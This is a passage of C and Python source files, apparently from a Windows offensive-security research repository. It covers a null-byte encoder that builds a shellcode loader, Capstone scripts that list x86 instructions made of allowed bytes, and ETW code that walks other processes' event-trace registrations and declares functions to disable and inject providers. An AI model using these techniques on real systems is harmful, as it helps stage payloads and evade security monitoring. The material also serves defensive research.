    outlen = fs.st_size + NULLZ_DECODER_SIZE + sizeof(int);
    buf = malloc(outlen);
    if(buf == NULL) {perror("malloc()"); goto make_end;}
    
    in = fopen(outfile, "rb");
    if(!in) {perror(outfile); goto make_end;}
    
    out = fopen(NULLZ_FILE, "wb");
    if(!out) {perror(NULLZ_FILE); goto make_end;}
   
    // find a key for the original length
    for(key = -1; key != 0; key--) {
      xlen = inlen ^ key;
      while(xlen) {
        if(!(xlen & 0xFF)) break;
        xlen >>= 8;
      }
      if(xlen == 0) break;
    }
    if(key == 0) {
      printf("unable to find key.\n");
      goto make_end;
    }
    
    // 1. copy decoder
    ptr = (u8*)buf;
    memcpy(ptr, NULLZ_DECODER, NULLZ_DECODER_SIZE);
    
    // 2. set the key to decrypt original length
    memcpy(&ptr[NULLZ_LEN], &key, sizeof(key));
    ptr += NULLZ_DECODER_SIZE;
    
    // 3. set the original length of code
    xlen = inlen ^ key;
    memcpy(ptr, &xlen, sizeof(xlen));
    ptr += sizeof(xlen);
    
    // 4. set the data to decode
    fread(ptr, 1, fs.st_size, in);
    
    // 5. save data to file
    fwrite(buf, 1, outlen, out);
    
    printf("Loader saved to %s\n", NULLZ_FILE);
make_end:
    if(buf)free(buf);
    if(out)fclose(out);
    if(in)fclose(in);
}

// encode a file to eliminate null bytes
static
void nullz_encode(FILE *in, FILE *out) {
    char c, t;
    
    for(;;) {
      // read byte
      c = getc(in);
      // end of file? exit
      if(feof(in)) break;
      // adding one is just an example
      t = c + 1;
      // is the result 0(avoid) or 1(escape)?
      if(t == 0 || t == 1) {
        // write escape sequence
        putc(0x01, out);
        // XOR is just an example. 
        // Avoid using 0x00 or 0xFF with XOR!
        putc(c ^ NULLZ_KEY, out);
      } else {
        // save byte plus 1
        putc(c + 1, out);
      }
    }
}

// decode a file to restore null bytes
static
void nullz_decode(FILE *in, FILE *out) {
    char c, t;
    
    for(;;) {
      // read byte
      c = getc(in);
      // end of file? exit
      if(feof(in)) break;
      // if this is an escape sequence
      if(c == 0x01) {
        // read next byte and XOR it
        c = getc(in);
        putc(c ^ NULLZ_KEY, out);
      } else {
        // else subtract byte
        putc(c - 1, out);
      }
    }
}

// User interface.  Args are input and output file.
int main(int argc, char **argv) {
    struct stat fs;
    FILE *in, *out;
    
    // Check arguments
    if ((argc!=4)||((argv[1][0]!='e')&&(argv[1][0]!='d'))) {
        printf("Usage: nullz e/d infile outfile\n");
        return 0;
    }
    if(stat(argv[2], &fs) != 0) {perror(argv[2]); return -1;}
    if(fs.st_size == 0) {printf("%s is empty.\n", argv[2]); return -1;}
    
    in = fopen(argv[2], "rb");
    if (!in) {perror(argv[2]); return -1;}
    
    out = fopen(argv[3], "wb");
    if (!out) {perror(argv[3]); return -1;}
    
    if (argv[1][0]=='e') {
        printf("Encoding %s to %s ...\n", argv[2], argv[3]);
        nullz_encode(in, out);
    } else {
        printf("Decoding %s from %s ...\n", argv[3], argv[2]);
        nullz_decode(in, out);
    }
    fclose(in);
    fclose(out);
    
    make_loader(fs.st_size, argv[3]);
    return 0;
}

```

`eminject/test_code/one.py`:

```py
# test1.py
from capstone import *
import array

md = Cs(CS_ARCH_X86, CS_MODE_64)
cs = bytearray(b'\x00\x00')

def is_allowed(ch):
  if(ch >= 0x80 and ch <= 0x8C):
    return False
  if(ch >= 0x91 and ch <= 0x9C):
    return False
  if(ch == 0x8E or ch == 0x9E or ch == 0x9F):
    return False
  return True
  
for i in range(0, 256):
  if not is_allowed(i): 
    continue
  cs[0] = i
  for insn in md.disasm(cs, 0):
    if insn.size == 1:
      print(''.join('\\x{:02x}'.format(x) for x in insn.bytes), end='')
      print(" /* %s\t%s */" %(insn.mnemonic, insn.op_str))

```

`eminject/test_code/three.py`:

```py
# test1.py
from capstone import *
import array

md = Cs(CS_ARCH_X86, CS_MODE_64)
cs = bytearray(b'\x00\x00\x00')

def is_allowed(ch):
  if(ch >= 0x80 and ch <= 0x8C):
    return False
  if(ch >= 0x91 and ch <= 0x9C):
    return False
  if(ch == 0x8E or ch == 0x9E or ch == 0x9F):
    return False
  return True
  
for i in range(0, 256):
  if not is_allowed(i): 
    continue
  cs[1] = i
  for insn in md.disasm(cs, 0):
    if insn.size == 3:
      print(''.join('\\x{:02x}'.format(x) for x in insn.bytes), end='')
      print(" /* %s\t%s */" %(insn.mnemonic, insn.op_str))

```

`eminject/test_code/three1.py`:

```py
# test1.py
from capstone import *
import array

md = Cs(CS_ARCH_X86, CS_MODE_64)
cs = bytearray(b'\x00\x00\x00')

def is_allowed(ch):
  if(ch >= 0x80 and ch <= 0x8C):
    return False
  if(ch >= 0x91 and ch <= 0x9C):
    return False
  if(ch == 0x8E or ch == 0x9E or ch == 0x9F):
    return False
  return True
  
for i in range(0, 256):
  if not is_allowed(i): 
    continue
  cs[0] = i
  for j in range(0, 256):
    if not is_allowed(j):
      continue
    cs[2] = j
    for insn in md.disasm(cs, 0):
      if insn.size == 3:
        print(''.join('\\x{:02x}'.format(x) for x in insn.bytes), end='')
        print(" /* %s\t%s */" %(insn.mnemonic, insn.op_str))

```

`eminject/test_code/two.py`:

```py
# test1.py
from capstone import *
import array

md = Cs(CS_ARCH_X86, CS_MODE_64)
cs = bytearray(b'\x00\x00')

def is_allowed(ch):
  if(ch >= 0x80 and ch <= 0x8C):
    return False
  if(ch >= 0x91 and ch <= 0x9C):
    return False
  if(ch == 0x8E or ch == 0x9E or ch == 0x9F):
    return False
  return True
  
for i in range(0, 256):
  if not is_allowed(i): 
    continue
  cs[0] = i
  for insn in md.disasm(cs, 0):
    if insn.size == 2:
      print(''.join('\\x{:02x}'.format(x) for x in insn.bytes), end='')
      print(" /* %s\t%s */" %(insn.mnemonic, insn.op_str))

```

`eminject/test_code/two1.py`:

```py
# test1.py
from capstone import *
import array

md = Cs(CS_ARCH_X86, CS_MODE_64)
cs = bytearray(b'\x00\x00')

def is_allowed(ch):
  if(ch >= 0x80 and ch <= 0x8C):
    return False
  if(ch >= 0x91 and ch <= 0x9C):
    return False
  if(ch == 0x8E or ch == 0x9E or ch == 0x9F):
    return False
  return True
  
for i in range(0, 256):
  if not is_allowed(i): 
    continue
  cs[1] = i
  for insn in md.disasm(cs, 0):
    if insn.size == 2:
      print(''.join('\\x{:02x}'.format(x) for x in insn.bytes), end='')
      print(" /* %s\t%s */" %(insn.mnemonic, insn.op_str))

```

`etw/etw.h`:

```h
/**
  Copyright © 2019 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */
  
#ifndef ETW_H
#define ETW_H

#include "../ntlib/util.h"
#include "../ntlib/ntddk.h"

#include <evntrace.h>
#include <pla.h>
#include <wbemidl.h>
#include <wmistr.h>
#include <Evntcons.h>

// http://www.geoffchappell.com/studies/windows/km/ntoskrnl/api/etw/traceapi/control/index.htm

typedef enum _ETW_TRACE_CONTROL_CODE {
    EtwStartLoggerCode = 1,
    EtwStopLoggerCode = 2,
    EtwQueryLoggerCode = 3,
    EtwUpdateLoggerCode = 4,
    EtwFlushLoggerCode = 5,
    EtwConnect = 11,
    EtwActivityIdCreate = 12,
    EtwWdiScenarioCode = 13,
    EtwDisconnect = 14,
    EtwRegisterGuid = 15,
    EtwReceiveNotification = 16,
    EtwEnableGuid = 17,
    EtwSendReplyDataBlock = 18,
    EtwReceiveReplyDataBlock = 19,
    
    EtwWdiSemUpdate = 20
} ETW_TRACE_CONTROL_CODE;

#define EventActivityIdControl  EtwEventActivityIdControl
#define EventEnabled            EtwEventEnabled
#define EventProviderEnabled    EtwEventProviderEnabled
#define EventRegister           EtwEventRegister
#define EventSetInformation     EtwEventSetInformation
#define EventUnregister         EtwEventUnregister
#define EventWrite              EtwEventWrite
#define EventWriteEndScenario   EtwEventWriteEndScenario
#define EventWriteEx            EtwEventWriteEx
#define EventWriteStartScenario EtwEventWriteStartScenario
#define EventWriteString        EtwEventWriteString
#define EventWriteTransfer      EtwEventWriteTransfer

#include <evntprov.h>
#include <evntrace.h>
#include <evntcons.h>

//////////////////////////////////////////////////////////////////////////
// Macros.
//////////////////////////////////////////////////////////////////////////

#define ALIGN_DOWN_BY(length, alignment) \
    ((ULONG_PTR)(length) & ~((ULONG_PTR)(alignment) - 1))

#define ALIGN_UP_BY(length, alignment) \
    (ALIGN_DOWN_BY(((ULONG_PTR)(length) + (alignment) - 1), alignment))

#define ALIGN_DOWN_POINTER_BY(address, alignment) \
    ((PVOID)((ULONG_PTR)(address) & ~((ULONG_PTR)(alignment) - 1)))

#define ALIGN_UP_POINTER_BY(address, alignment) \
    (ALIGN_DOWN_POINTER_BY(((ULONG_PTR)(address) + (alignment) - 1), alignment))

#define ALIGN_DOWN(length, type) \
    ALIGN_DOWN_BY(length, sizeof(type))

#define ALIGN_UP(length, type) \
    ALIGN_UP_BY(length, sizeof(type))

#define ALIGN_DOWN_POINTER(address, type) \
    ALIGN_DOWN_POINTER_BY(address, sizeof(type))

#define ALIGN_UP_POINTER(address, type) \
    ALIGN_UP_POINTER_BY(address, sizeof(type))

#define ETW_SESSION_HANDLE(WmiLoggerInformation) \
  ((USHORT)(((PWMI_LOGGER_INFORMATION)(WmiLoggerInformation))->Wnode.HistoricalContext))

//////////////////////////////////////////////////////////////////////////
// Definitions.
//////////////////////////////////////////////////////////////////////////

#define EVENT_TRACE_CLOCK_RAW           0x00000000  // Use Raw timestamp
#define EVENT_TRACE_CLOCK_PERFCOUNTER   0x00000001  // Use HighPerfClock (Default)
#define EVENT_TRACE_CLOCK_SYSTEMTIME    0x00000002  // Use SystemTime
#define EVENT_TRACE_CLOCK_CPUCYCLE      0x00000003  // Use CPU cycle counter

#define SINGLE_LIST_ENTRY_FREE          ((PSINGLE_LIST_ENTRY)0)
#define SINGLE_LIST_ENTRY_MARKED        ((PSINGLE_LIST_ENTRY)1)


//////////////////////////////////////////////////////////////////////////
// Enumerations.
//////////////////////////////////////////////////////////////////////////

typedef enum _ETW_NOTIFICATION_TYPE {
    EtwNotificationTypeNoReply = 1,     // No data block reply
    EtwNotificationTypeLegacyEnable,    // Enable notification for RegisterTraceGuids
    EtwNotificationTypeEnable,          // Enable notification for EventRegister
    EtwNotificationTypePrivateLogger,   // Private logger notification for ETW
    EtwNotificationTypePerflib,         // PERFLIB V2 counter data request/delivery block
    EtwNotificationTypeAudio,           // Private notification for audio policy
    EtwNotificationTypeSession,         // Session related ETW notifications
    EtwNotificationTypeReserved,        // For internal use (test)
    EtwNotificationTypeCredentialUI,    // Private notification for media center elevation detection
    EtwNotificationTypeInProcSession,   // Private in-proc session related ETW notifications
    EtwNotificationTypeMax

} ETW_NOTIFICATION_TYPE;

typedef enum _ETW_BUFFER_STATE {
    EtwBufferStateFree = 0,
    EtwBufferStateGeneralLogging = 1,
    EtwBufferStateCSwitch = 2,
    EtwBufferStateFlush = 3,
    EtwBufferStatePendingCompression = 4,
    EtwBufferStateCompressed = 5,
    EtwBufferStatePlaceholder = 6,
    EtwBufferStateMaximum = 7,
} ETW_BUFFER_STATE;

typedef enum _ETW_FUNCTION_CODE {
    EtwFunctionStartTrace = 1,
    EtwFunctionStopTrace = 2,
    EtwFunctionQueryTrace = 3,
    EtwFunctionUpdateTrace = 4,
    EtwFunctionFlushTrace = 5,
    EtwFunctionIncrementTraceFile = 6,

    EtwFunctionRealtimeConnect = 11,
    EtwFunctionWdiDispatchControl = 13,
    EtwFunctionRealtimeDisconnectConsumerByHandle = 14,
    EtwFunctionReceiveNotification = 16,
    EtwFunctionTraceEnableGuid = 17,
    EtwFunctionSendReplyDataBlock = 18,
    EtwFunctionReceiveReplyDataBlock = 19,
    EtwFunctionWdiUpdateSem = 20,
    EtwFunctionGetTraceGuidList = 21,
    EtwFunctionGetTraceGuidInfo = 22,
    EtwFunctionEnumerateTraceGuids = 23,
    EtwFunctionRegisterSecurityProvider = 24,
    EtwFunctionQueryReferenceTime = 25,
    EtwFunctionTrackProviderBinary = 26,
    EtwFunctionAddNotificationEvent = 27,
    EtwFunctionUpdateDisallowList = 28,
    EtwFunctionUseDescriptorTypeUm = 31,
    EtwFunctionGetTraceGroupList = 32,
    EtwFunctionGetTraceGroupInfo = 33,
    EtwFunctionGetDisallowList = 34,
    EtwFunctionSetCompressionSettings = 35,
    EtwFunctionGetCompressionSettings = 36,
    EtwFunctionUpdatePeriodicCaptureState = 37,
    EtwFunctionGetPrivateSessionTraceHandle = 38,
    EtwFunctionRegisterPrivateSession = 39,
    EtwFunctionQuerySessionDemuxObject = 40,
    EtwFunctionSetProviderBinaryTracking = 41,
    EtwFunctionGetMaxLoggers = 42,
} ETW_FUNCTION_CODE;

//////////////////////////////////////////////////////////////////////////
// Structures.
//////////////////////////////////////////////////////////////////////////

typedef struct _WMI_LOGGER_INFORMATION
{
  WNODE_HEADER Wnode;
  ULONG BufferSize;
  ULONG MinimumBuffers;
  ULONG MaximumBuffers;
  ULONG MaximumFileSize;
  ULONG LogFileMode;
  ULONG FlushTimer;
  ULONG EnableFlags;
  union
  {
    LONG AgeLimit;
    LONG FlushThreshold;
  };
  ULONG Wow;
  LONG Padding_719;
  union
  {
    PVOID LogFileHandle;
    ULONGLONG LogFileHandle64;
  };
  union
  {
    ULONG NumberOfBuffers;
    ULONG InstanceCount;
  };
  union
  {
    ULONG FreeBuffers;
    ULONG InstanceId;
  };
  union
  {
    ULONG EventsLost;
    ULONG NumberOfProcessors;
  };
  ULONG BuffersWritten;
  union
  {
    ULONG LogBuffersLost;
    ULONG Flags;
  };
  ULONG RealTimeBuffersLost;
  union
  {
    PVOID LoggerThreadId;
    ULONGLONG LoggerThreadId64;
  };
  union
  {
    UNICODE_STRING LogFileName;
    //STRING64 LogFileName64;
  };
  union
  {
    UNICODE_STRING LoggerName;
    //STRING64 LoggerName64;
  };
  ULONG RealTimeConsumerCount;
  ULONG SpareUlong;
  union
  {
    union
    {
      PVOID LoggerExtension;
      ULONGLONG LoggerExtension64;
    };
  }  DUMMYUNIONNAME10;
} WMI_LOGGER_INFORMATION, *PWMI_LOGGER_INFORMATION;

typedef struct _ETW_NOTIFICATION_HEADER
{
    ETW_NOTIFICATION_TYPE NotificationType; // Notification type
    ULONG                 NotificationSize; // Notification size in bytes

    ULONG                 Offset;           // Offset to the next notification
    BOOLEAN               ReplyRequested;   // Reply Requested

    ULONG                 Timeout;          // Timeout in milliseconds when requesting reply

    union {
        ULONG             ReplyCount;       // Out to sender: the number of notifications sent
        ULONG             NotifyeeCount;    // Out to notifyee: the order during notification
    };
    union
    {
      ULONGLONG ReplyHandle;
      PVOID ReplyObject;
      ULONG RegIndex;
    };
    ULONG TargetPID;
    ULONG SourcePID;
    GUID DestinationGuid;
    GUID SourceGuid;
} ETW_NOTIFICATION_HEADER, *PETW_NOTIFICATION_HEADER;

typedef struct _TRACE_ENABLE_CONTEXT {
    USHORT LoggerId;
    UCHAR Level;
    UCHAR InternalFlag;
    ULONG EnableFlags;
} TRACE_ENABLE_CONTEXT, *PTRACE_ENABLE_CONTEXT;

typedef struct _ETW_ENABLE_NOTIFICATION_PACKET {
    ETW_NOTIFICATION_HEADER DataBlockHeader;
    TRACE_ENABLE_INFO EnableInfo;
    TRACE_ENABLE_CONTEXT LegacyEnableContext;
    ULONG LegacyProviderEnabled;
    ULONG FilterCount;
} ETW_ENABLE_NOTIFICATION_PACKET, *PETW_ENABLE_NOTIFICATION_PACKET;

typedef struct _ETW_REF_CLOCK {
    LARGE_INTEGER StartTime;
    LARGE_INTEGER StartPerfClock;
} ETW_REF_CLOCK, *PETW_REF_CLOCK;

typedef struct _ETW_REALTIME_CONNECT_CONTEXT {
    ULONG LoggerId;
    ULONG ReserveBufferSpaceSize;
    ULONGLONG ReserveBufferSpacePtr;
    ULONGLONG ReserveBufferSpaceBitMapPtr;
    ULONGLONG DisconnectEvent;
    ULONGLONG DataAvailableEvent;
    ULONGLONG BufferListHeadPtr;
    ULONGLONG BufferCountPtr;
    ULONGLONG EventsLostCountPtr;
    ULONGLONG BuffersLostCountPtr;
    ULONGLONG ConnectHandle;
    ETW_REF_CLOCK RealtimeReferenceTime;
} ETW_REALTIME_CONNECT_CONTEXT, *PETW_REALTIME_CONNECT_CONTEXT;

typedef struct _WMI_BUFFER_HEADER {
  ULONG BufferSize;
  ULONG SavedOffset;
  volatile ULONG CurrentOffset;
  volatile LONG ReferenceCount;
  LARGE_INTEGER TimeStamp;
  LONGLONG SequenceNumber;
  union
  {
    struct
    {
      ULONGLONG ClockType : 3;
      ULONGLONG Frequency : 61;
    };
    SINGLE_LIST_ENTRY SlistEntry;
    struct _WMI_BUFFER_HEADER* NextBuffer;
  };
  ETW_BUFFER_CONTEXT ClientContext;
  ETW_BUFFER_STATE State;
  ULONG Offset;
  USHORT BufferFlag;
  USHORT BufferType;
  union
  {
    ULONG Padding1[4];
    ETW_REF_CLOCK ReferenceTime;
    LIST_ENTRY GlobalEntry;
    struct
    {
      PVOID Pointer0;
      PVOID Pointer1;
    };
  };
} WMI_BUFFER_HEADER, *PWMI_BUFFER_HEADER;

typedef ULONG (NTAPI *PETW_NOTIFICATION_CALLBACK) (
    PETW_NOTIFICATION_HEADER NotificationHeader,
    PVOID Context
    );
    
typedef struct _MCGEN_TRACE_CONTEXT {
    TRACEHANDLE      RegistrationHandle;
    TRACEHANDLE      Logger;
    ULONGLONG        MatchAnyKeyword;
    ULONGLONG        MatchAllKeyword;
    ULONG            Flags;
    ULONG            IsEnabled;
    UCHAR            Level;
    UCHAR            Reserve;
    USHORT           EnableBitsCount;
    PULONG           EnableBitMask;
    const PULONGLONG EnableKeyWords;
    const PUCHAR     EnableLevel;
} MCGEN_TRACE_CONTEXT, *PMCGEN_TRACE_CONTEXT;

typedef struct _RTL_BALANCED_NODE {
    union {
      struct _RTL_BALANCED_NODE *Children[2];
      struct {
        struct _RTL_BALANCED_NODE *Left;
        struct _RTL_BALANCED_NODE *Right;
      };
    };
    union {
      UCHAR     Red:1;
      UCHAR     Balance:2;
      ULONG_PTR ParentValue;
    };
} RTL_BALANCED_NODE, *PRTL_BALANCED_NODE;

typedef NTSTATUS (*PETWENABLECALLBACK) (
  LPCGUID                  SourceId,
  ULONG                    ControlCode,
  UCHAR                    Level,
  ULONGLONG                MatchAnyKeyword,
  ULONGLONG                MatchAllKeyword,
  PEVENT_FILTER_DESCRIPTOR FilterData,
  PVOID                    CallbackContext);

typedef struct _RTL_RB_TREE {
    struct _RTL_BALANCED_NODE* Root;
    union {
      UCHAR Encoded:1; /* bit position: 0 */
      struct _RTL_BALANCED_NODE* Min;
    };
} RTL_RB_TREE, *PRTL_RB_TREE;
    
typedef struct _ETW_USER_REG_ENTRY {
    RTL_BALANCED_NODE   RegList;           // List of registration entries
    ULONG64             Padding1;
    GUID                ProviderId;        // GUID to identify Provider
    PETWENABLECALLBACK  Callback;          // Callback function executed in response to NtControlTrace
    PVOID               CallbackContext;   // Optional context
    SRWLOCK             RegLock;           // 
    SRWLOCK             NodeLock;          // 
    HANDLE              Thread;            // Handle of thread for callback
    HANDLE              ReplyHandle;       // Used to communicate with the kernel via NtTraceEvent
    USHORT              RegIndex;          // Index in EtwpRegistrationTable
    USHORT              RegType;           // 14th bit indicates a private
    ULONG64             Unknown[19];
} ETW_USER_REG_ENTRY, *PETW_USER_REG_ENTRY;

#ifdef __cplusplus
extern "C" {
#endif

  BSTR etw_id2name(OLECHAR *id);
  BOOL etw_disable(HANDLE hp, PRTL_BALANCED_NODE node, USHORT index); 
  VOID etw_reg_info(HANDLE hp, PRTL_BALANCED_NODE node, PETW_USER_REG_ENTRY re, int tabs);
  VOID etw_dump_nodes(HANDLE hp, PRTL_BALANCED_NODE node, PWCHAR dll, int opt, int tabs);
  VOID etw_search_process(HANDLE hp, PPROCESSENTRY32 pe32, LPVOID etw, PWCHAR dll, int opt);
  LPVOID etw_get_table_va(VOID);
  PRTL_BALANCED_NODE etw_get_reg(HANDLE hp, LPVOID etw, PWCHAR prov, PETW_USER_REG_ENTRY re); 
  BOOL etw_inject(DWORD pid, PWCHAR path, PWCHAR prov);
  BOOL etw_disable(HANDLE hp, PRTL_BALANCED_NODE node, USHORT index);
  VOID etw_search_system(DWORD pid, PWCHAR dll, PWCHAR prov, int opt);

#ifdef __cplusplus
}
#endif
    
#endif

```

`etw/etwdump.c`:

```c
/**
  Copyright © 2020 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#include "etw.h"

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "version.lib")

#define ETW_OPT_SEARCH  (1 << 1)
#define ETW_OPT_DISABLE (1 << 2)
#define ETW_OPT_INJECT  (1 << 3)
#define ETW_OPT_TRACERS (1 << 4)

DWORD prov_cnt = 0, disabled_cnt = 0;

// Convert a Native NT path to MS-DOS path
VOID native2dos(WCHAR native[], WCHAR dos[]) {
    HANDLE            hf;
    NTSTATUS          nts;
    OBJECT_ATTRIBUTES oa;
    UNICODE_STRING    us;
    IO_STATUS_BLOCK   iosb;
    
    RtlInitUnicodeString(&us, native);
    InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE, NULL, NULL);
      
    nts = NtOpenFile(
      &hf, FILE_GENERIC_READ,
      &oa, &iosb, FILE_SHARE_READ, 0);
      
    GetFinalPathNameByHandle(hf, dos, MAX_PATH, VOLUME_NAME_DOS);
    NtClose(hf);
}

// Read description of file from version information
PWCHAR get_file_description(WCHAR path[]) {
    DWORD            len, infolen, hinfo;
    WCHAR            buf[512];
    LPVOID           info, value;
    VS_FIXEDFILEINFO *finfo;
    static WCHAR     desc[MAX_PATH];
    WCHAR            dospath[MAX_PATH]={0};
    
    native2dos(path, dospath);
    
    infolen = GetFileVersionInfoSize(dospath, &hinfo);
    if(!infolen) return L"N/A";
    
    // allocate memory
    info = malloc(infolen);
    
    GetFileVersionInfo(dospath, hinfo, infolen, info);
    
    VerQueryValue(info, L"\\", (LPVOID*)&finfo, &len);
    
    // query languages
    struct LANGANDCODEPAGE {
        WORD wLanguage;
        WORD wCodePage;
    } *lpTranslate;

    UINT cbTranslate = 0;
    
    VerQueryValue(info, 
      L"\\VarFileInfo\\Translation", 
      (LPVOID*)&lpTranslate, &cbTranslate);

    // use first in list
    swprintf(buf, 
      ARRAYSIZE(buf), 
      L"\\StringFileInfo\\%04x%04x\\FileDescription", 
      lpTranslate[0].wLanguage, 
      lpTranslate[0].wCodePage);
      
    VerQueryValue(info, buf, &value, &len);
    
    if(value == NULL) return L"N/A";
    
    lstrcpy(desc, value);
    free(info);
    
    return desc;
}

// Convert provider id (GUID) to display name
BSTR etw_id2name(OLECHAR *id) {
    HRESULT                   hr;
    static ITraceDataProvider *prov = NULL;
    static BSTR               name = NULL;
    static BOOL               init = FALSE;
    
    if(!init) {
      hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
      if(hr == S_OK) {
        hr = CoCreateInstance(
          &CLSID_TraceDataProvider,
          0,
          CLSCTX_INPROC_SERVER,
          &IID_ITraceDataProvider,
          (LPVOID*)&prov);
        if(hr == S_OK) init = TRUE;
      }
    }
    
    // query details for the provider GUID
    hr = prov->lpVtbl->Query(prov, id, NULL);
    
    if(hr == S_OK) {
      // read the display name
      hr = prov->lpVtbl->get_DisplayName(prov, &name);
    }
    //prov->lpVtbl->Release(prov);
    
    return hr == S_OK ? name : L"Unknown";
}

// Display information about an ETW registration entry
VOID etw_reg_info(
    HANDLE              hp, 
    PRTL_BALANCED_NODE  node,
    PETW_USER_REG_ENTRY re, 
    int                 tabs) 
{
    SIZE_T       rd;
    WCHAR        cbfile[MAX_PATH], ctfile[MAX_PATH];
    BYTE         buffer[sizeof(SYMBOL_INFO)+MAX_SYM_NAME*sizeof(WCHAR)];
    PSYMBOL_INFO pSymbol=(PSYMBOL_INFO)buffer;
    OLECHAR      id[40];
    ULONG_PTR    disp;
    
    // increase number of providers found/displayed
    prov_cnt++;
    
    wprintf(L"%*sNode        : %p\n", 
      tabs, L"\t", (PVOID)node);
      
    StringFromGUID2(&re->ProviderId, id, sizeof(id));
    wprintf(L"%*sGUID        : %s (%s)\n", 
      tabs, L"\t", id, etw_id2name(id));
    
    ZeroMemory(cbfile, ARRAYSIZE(cbfile));
    
    GetMappedFileName(hp, 
      (LPVOID)re->Callback, cbfile, MAX_PATH);
    
    wprintf(L"%*sDescription : %s\n", 
      tabs, L"\t", get_file_description(cbfile));
      
    PathStripPath(cbfile);
     
    wprintf(L"%*sCallback    : %p : %s", 
      tabs, L"\t", re->Callback, cbfile);
    
    pSymbol->SizeOfStruct = sizeof(SYMBOL_INFO);
    pSymbol->MaxNameLen   = MAX_SYM_NAME;
    
    if(SymFromAddr(hp, (ULONG_PTR)re->Callback, NULL, pSymbol)) {
      wprintf(L"!%hs", pSymbol->Name);
    }
    putchar('\n');

    // display context          
    ZeroMemory(ctfile, ARRAYSIZE(ctfile));
    
    GetMappedFileName(hp, 
      (LPVOID)re->CallbackContext, ctfile, MAX_PATH);
     
    PathStripPath(ctfile);

    wprintf(L"%*sContext     : %p : %s", 
      tabs, L"\t", (PVOID)re->CallbackContext,  ctfile);
    
    pSymbol->SizeOfStruct = sizeof(SYMBOL_INFO);
    pSymbol->MaxNameLen   = MAX_SYM_NAME;
    
    if(SymFromAddr(hp, (DWORD64)re->CallbackContext, NULL, pSymbol)) {
      wprintf(L"!%hs", pSymbol->Name);
    }
    putchar('\n');
    
    wprintf(L"%*sIndex       : %i\n", 
      tabs, L"\t", re->RegIndex);    
      
    wprintf(L"%*sType        : %i (0x%x)\n", 
      tabs, L"\t", re->RegType,re->RegType);
      
    // display the registration handle that
    // can be used with EtwEventUnregister
    wprintf(L"%*sReg Handle  : %p\n",
      tabs, L"\t", 
      (PVOID)((ULONG64)node | (ULONG64)re->RegIndex << 48));
      
    wprintf(L"%*sThread      : %p\n",
      tabs, L"\t",
      (PVOID)re->Thread);
      
    wprintf(L"%*sReplyHandle : %p\n\n",
      tabs, L"\t",
      (PVOID)re->ReplyHandle);
}

// dump nodes
VOID etw_dump_nodes(
    HANDLE             hp, 
    PRTL_BALANCED_NODE node, 
    PWCHAR             dll,
    int                opt,    
    int                tabs) 
{
    SIZE_T             rd;
    BOOL               bRead;
    ETW_USER_REG_ENTRY re;
    WCHAR              path[MAX_PATH];
    
    if(node == NULL) return;
    
    // read ETW_USER_REG_ENTRY into local memory
    bRead = ReadProcessMemory(
      hp, (PBYTE)node, &re, sizeof(re), &rd);
    if(!bRead) return;
      
    // filter by DLL?
    if(dll != NULL) {
      GetMappedFileName(hp, 
        (LPVOID)re.Callback, 
        path, MAX_PATH);
        
      if(StrStrI(path, dll) != NULL) {
        etw_reg_info(hp, node, &re, tabs + 1);
      }
    } else {
      etw_reg_info(hp, node, &re, tabs + 1);
    }
    
    etw_dump_nodes(hp, re.RegList.Children[0], dll, opt, tabs + 1);
    etw_dump_nodes(hp, re.RegList.Children[1], dll, opt, tabs + 1);
}

VOID etw_search_process(
    HANDLE          hp, 
    PPROCESSENTRY32 pe32,
    LPVOID          etw,
    PWCHAR          dll,
    int             opt)
{
    SIZE_T      rd;
    RTL_RB_TREE tree;
    CHAR        path[MAX_PATH];
    
